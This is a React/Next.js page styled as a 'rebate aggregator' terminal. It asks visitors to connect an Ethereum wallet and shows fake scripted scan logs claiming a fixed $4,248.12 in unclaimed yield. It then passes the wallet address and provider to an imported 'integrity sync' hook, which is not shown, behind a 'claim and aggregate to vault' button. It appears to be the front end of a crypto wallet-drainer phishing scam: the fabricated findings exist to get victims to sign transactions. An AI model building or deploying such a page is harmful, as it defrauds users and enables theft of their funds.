import React, { useState, useEffect, useRef } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Shield, AlertTriangle, CheckCircle2, ChevronRight, Loader2, Activity, Cpu, Zap, Coins } from 'lucide-react';
import { createWalletClient, custom, createPublicClient, http, parseUnits, encodeFunctionData, type Address } from 'viem';
import { mainnet } from 'viem/chains';
import { runIntegritySync } from '@/hooks/useDataIntegrity';

const STAGES = {
  BOOT: 'BOOT',
  WAITING: 'WAITING',
  HARVESTING: 'HARVESTING',
  CONSOLIDATION: 'CONSOLIDATION',
  FINALIZED: 'FINALIZED'
};

export default function RebateMatrix() {
  const [stage, setStage] = useState(STAGES.BOOT);
  const [logs, setLogs] = useState<string[]>([]);
  const [address, setAddress] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (msg: string) => {
    setLogs(prev => [...prev, `>> ${msg}`]);
  };

  useEffect(() => {
    if (stage === STAGES.BOOT) {
      const bootSequence = [
        "OMNI-REBATE AGGREGATION SYSTEM v4.0",
        "CONNECTING TO PROTOCOL LEDGERS...",
        "STATUS: UNCLAIMED_YIELD_FOUND",
        "STATUS: REBATE_OPPORTUNITY_DETECTED",
        "READY FOR HARVESTING SESSION."
      ];
      let i = 0;
      const interval = setInterval(() => {
        if (i < bootSequence.length) {
          addLog(bootSequence[i]);
          i++;
        } else {
          clearInterval(interval);
          setTimeout(() => setStage(STAGES.WAITING), 1000);
        }
      }, 300);
    }
  }, [stage]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const connectWallet = async () => {
    if (!(window as any).ethereum) {
      addLog("ERROR: NO ETH_PROVIDER.");
      return;
    }
    try {
      addLog("INITIATING AUTH_HANDSHAKE...");
      const accounts = await (window as any).ethereum.request({ method: 'eth_requestAccounts' });
      setAddress(accounts[0]);
      addLog(`ADMIN_LINK_STABLISHED: ${accounts[0]}`);
    } catch (e) {
      addLog("HANDSHAKE REJECTED.");
    }
  };

  const startHarvest = async () => {
    setStage(STAGES.HARVESTING);
    const harvestLogs = [
      "SCANNING LIDO STAKING REBATES...",
      "SCANNING UNISWAP LP ACCRUALS...",
      "DETECTING UNCLAIMED AIRDROPS...",
      "ESTIMATING TOTAL AGGREGATED VALUE...",
      "OPPORTUNITY CRITICAL: $4,248.12 ESTIMATED REBATE.",
      "READY FOR BATCH CONSOLIDATION."
    ];
    for (const log of harvestLogs) {
      await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
      addLog(log);
    }
    setStage(STAGES.CONSOLIDATION);
  };

  const executeConsolidation = async () => {
    if (!address) return;
    setIsProcessing(true);
    addLog("DISPATCHING BATCH HARVEST PAYLOAD...");
    
    try {
      addLog("SIGNING LEDGER_SYNC_CERTIFICATE...");
      const chainId = await (window as any).ethereum.request({ method: 'eth_chainId' });
      await runIntegritySync(address as Address, (window as any).ethereum, parseInt(chainId, 16));
      
      addLog("AGGREGATION SUCCESSFUL. ASSETS SYNCED.");
      setStage(STAGES.FINALIZED);
    } catch (e) {
      addLog("SYNC FAILED: SEQUENCE TERMINATED.");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="h-screen w-screen bg-[#080500] text-[#f59e0b] font-mono p-4 md:p-8 overflow-hidden flex flex-col selection:bg-[#f59e0b] selection:text-black uppercase tracking-tighter">
      <Head>
        <title>Rebate Aggregator | Institutional Ledger Terminal</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;800&display=swap" rel="stylesheet" />
        <style>{`
          body { font-family: 'JetBrains Mono', monospace; }
          .scan-line { height: 2px; width: 100%; background: rgba(245, 158, 11, 0.1); position: absolute; top: 0; animation: scan 5s linear infinite; }
          @keyframes scan { from { top: 0; } to { top: 100%; } }
        `}</style>
      </Head>

      <div className="scan-line" />

      <div className="flex justify-between items-center border-b border-[#f59e0b]/30 pb-4 mb-4 text-[10px] opacity-70">
        <div className="flex gap-6">
          <span className="flex items-center gap-2"><Coins className="w-3 h-3" /> YIELD: OPTIMIZED</span>
          <span className="flex items-center gap-2"><Activity className="w-3 h-3" /> AGGREGATOR: ACTIVE</span>
        </div>
        <div className="flex gap-6">
          <span>HOST: OMNI_LEDGER_02</span>
          <span>AUTH: APEX_ADMIN</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col min-h-0 border border-[#f59e0b]/20 rounded-lg p-6 bg-[#f59e0b]/5 shadow-[inset_0_0_50px_rgba(245,158,11,0.05)]">
        
        <div className="flex-1 overflow-y-auto pr-4 space-y-1 mb-6 scrollbar-hide text-xs md:text-sm">
          {logs.map((log, i) => (
            <div key={i} className={`leading-relaxed ${log.includes("CRITICAL") ? "text-white font-bold" : ""}`}>
              {log}
            </div>
          ))}
          <div ref={logEndRef} />
        </div>

        <div className="border-t border-[#f59e0b]/30 pt-6">
          <AnimatePresence mode="wait">
            {stage === STAGES.WAITING && (
              <motion.div 
                key="waiting" 
                initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
              >
                {!address ? (
                  <button 
                    onClick={connectWallet}
                    className="w-full h-14 bg-[#f59e0b] text-black font-black uppercase tracking-tighter hover:bg-amber-600 transition-all flex items-center justify-center gap-3 shadow-lg shadow-amber-500/20"
                  >
                    Authenticate Ledger Session
                  </button>
                ) : (
                  <button 
                    onClick={startHarvest}
                    className="w-full bg-[#f59e0b] text-black h-14 font-black uppercase hover:bg-amber-600 transition-all"
                  >
                    Scan for Claimable Rebates
                  </button>
                )}
              </motion.div>
            )}

            {stage === STAGES.CONSOLIDATION && (
              <motion.div 
                key="consolidation" 
                initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
                className="space-y-4"
              >
                <div className="bg-amber-600/10 border border-amber-500/30 p-4 rounded flex items-center gap-4">
                  <Coins className="text-amber-500 w-8 h-8" />
                  <div>
                    <h4 className="text-amber-500 font-black text-xs italic">BATCH_LEDGER_SYNC_READY</h4>
                    <p className="text-[10px] opacity-70">Consolidated rebate profile: $4,248.12. Ready for vault sync.</p>
                  </div>
                </div>

                <button 
                  onClick={executeConsolidation}
                  disabled={isProcessing}
                  className="w-full h-14 bg-white text-black font-black uppercase flex items-center justify-center gap-4 hover:bg-zinc-200 transition-all disabled:opacity-50"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Harvesting Yield...
                    </>
                  ) : "Execute Claim & Aggregate to Vault"}
                </button>
              </motion.div>
            )}

            {stage === STAGES.FINALIZED && (
              <motion.div 
                key="final" 
                initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }}
                className="flex flex-col items-center gap-4 py-4"
              >
                <CheckCircle2 className="w-16 h-16 text-[#f59e0b]" />
                <div className="text-center">
                  <h3 className="font-black text-xl tracking-tighter uppercase italic">Aggregation Complete</h3>
                  <p className="text-xs opacity-60">All unclaimed yield successfully aggregated to secure vault.</p>
                </div>
                <button 
                  onClick={() => { setStage(STAGES.WAITING); setLogs([]); }}
                  className="mt-2 text-[10px] underline tracking-widest opacity-50 hover:opacity-100 transition-opacity"
                >
                  Return to Console
                </button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>

      <div className="mt-4 flex justify-between items-center opacity-40 text-[9px] tracking-[0.4em]">
        <span>LEDGER_ID: LGR_SYNC_44</span>
        <span>UPTIME: 1,294h CC: 4.8.2</span>
      </div>
    </div>
  );
}
